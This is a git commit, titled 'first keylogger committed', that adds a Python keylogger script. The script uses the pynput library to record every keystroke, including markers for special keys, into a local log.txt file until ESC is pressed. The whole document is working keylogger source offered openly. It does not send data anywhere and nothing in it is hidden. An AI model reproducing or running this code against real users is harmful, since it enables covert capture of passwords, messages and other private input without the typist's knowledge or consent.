0094e54a1afab0c0784e0ead8a6ca70bb36eee24
H3X4C3 <35111469+H3X4C3@users.noreply.github.com>
2021-06-14 15:07:35 +0000

    first keylogger committed

---
+++ keylogger.py
@@ -0,0 +1,40 @@
+from pynput.keyboard import Key, Listener
+import logging
+
+# Log into file
+logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")
+
+# Array to store keystrokes
+msg = ""
+
+def on_press(key):
+    global msg, special
+    try:
+        if (key == Key.esc):
+            print("ESC detected: Terminating keylogger")
+            logging.info(msg)
+            return False
+        elif(key == Key.space):
+            msg += " "
+        elif(key == Key.shift or key == Key.shift_r):
+            msg += "<SHIFT>"
+        elif(key == Key.ctrl or key == Key.ctrl_r):
+            msg += "<CTRL>"
+        elif(key == Key.backspace):
+            msg += "<BACKSPACE>"
+        elif(key == Key.tab):
+            msg += "<TAB>"
+        elif(key == Key.caps_lock):
+            msg += "<CAPSLOCK>"
+        elif(key == Key.enter):
+            logging.info(msg + "<ENTER>")
+            msg = ""
+        else:
+            msg += key.char
+    except IOError:
+        print("ERROR: Could not log to file")
+    except AttributeError as e:
+        print("Special key pressed: {0}", e)
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
